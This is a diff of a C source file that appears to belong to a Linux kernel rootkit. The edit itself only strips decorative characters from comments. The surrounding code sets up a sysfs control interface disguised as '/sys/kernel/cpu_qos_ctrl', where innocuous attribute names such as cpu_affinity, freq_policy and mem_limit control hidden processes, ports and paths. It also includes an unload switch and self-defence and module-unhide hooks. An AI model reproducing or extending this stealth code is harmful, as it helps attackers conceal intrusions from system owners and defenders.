@@ -1,4 +1,4 @@
-/* sysfs_iface.c — /sys/kernel/cpu_qos_ctrl/ control interface
+/* sysfs_iface.c   /sys/kernel/cpu_qos_ctrl/ control interface
  * Provides userspace control for the agent (TTP K-02).
  *
  * Attributes:
@@ -12,22 +12,22 @@
 #include "../include/sysfs_iface.h"
 #include "../include/pid_manager.h"
 
-/* ── Exported globals ────────────────────────────────────────── */
+/*  Exported globals                                          */
 
 u16  bat_hidden_ports[MAX_HIDDEN_PORTS]         = {0};
 int  bat_hidden_port_count                      = 0;
 char bat_hidden_paths[MAX_HIDDEN_PATHS][MAX_PATH_LEN];
 int  bat_hidden_path_count                      = 0;
 
-/* ── Forward declarations for S2 hooks (stubs in S1) ─────────── */
+/*  Forward declarations for S2 hooks (stubs in S1)           */
 void __attribute__((weak)) selfdefense_exit(void)  {}
 void __attribute__((weak)) module_unhide(void)     {}
 
-/* ── Kobject ─────────────────────────────────────────────────── */
+/*  Kobject                                                   */
 
 static struct kobject *bat_kobj;
 
-/* ── cpu_affinity (hidden PIDs) ───────────────────────────────── */
+/*  cpu_affinity (hidden PIDs)                                 */
 
 static ssize_t show_cpu_affinity(struct kobject *kobj, struct kobj_attribute *attr,
                                   char *buf)
@@ -60,7 +60,7 @@ static ssize_t store_cpu_affinity(struct kobject *kobj, struct kobj_attribute *a
     return count;
 }
 
-/* ── freq_policy (hidden ports) ───────────────────────────────── */
+/*  freq_policy (hidden ports)                                 */
 
 static ssize_t show_freq_policy(struct kobject *kobj, struct kobj_attribute *attr,
                                  char *buf)
@@ -84,7 +84,7 @@ static ssize_t store_freq_policy(struct kobject *kobj, struct kobj_attribute *at
     return count;
 }
 
-/* ── mem_limit (hidden paths) ─────────────────────────────────── */
+/*  mem_limit (hidden paths)                                   */
 
 static ssize_t show_mem_limit(struct kobject *kobj, struct kobj_attribute *attr,
                                char *buf)
@@ -116,7 +116,7 @@ static ssize_t store_mem_limit(struct kobject *kobj, struct kobj_attribute *attr
     return count;
 }
 
-/* ── qos_state (status) ───────────────────────────────────────── */
+/*  qos_state (status)                                         */
 
 static ssize_t show_qos_state(struct kobject *kobj, struct kobj_attribute *attr,
                                char *buf)
@@ -128,7 +128,7 @@ static ssize_t show_qos_state(struct kobject *kobj, struct kobj_attribute *attr,
                      bat_hidden_path_count);
 }
 
-/* ── sched_reset (unload) ─────────────────────────────────────── */
+/*  sched_reset (unload)                                       */
 
 static ssize_t store_sched_reset(struct kobject *kobj, struct kobj_attribute *attr,
                                   const char *buf, size_t count)
@@ -141,7 +141,7 @@ static ssize_t store_sched_reset(struct kobject *kobj, struct kobj_attribute *at
     return count;
 }
 
-/* ── Attribute definitions ────────────────────────────────────── */
+/*  Attribute definitions                                      */
 
 static struct kobj_attribute cpu_affinity_attr =
     __ATTR(cpu_affinity, 0600, show_cpu_affinity, store_cpu_affinity);
@@ -167,7 +167,7 @@ static struct attribute_group bat_attr_group = {
     .attrs = bat_attrs,
 };
 
-/* ── Init / Exit ─────────────────────────────────────────────── */
+/*  Init / Exit                                               */
 
 int sysfs_iface_init(void)
 {
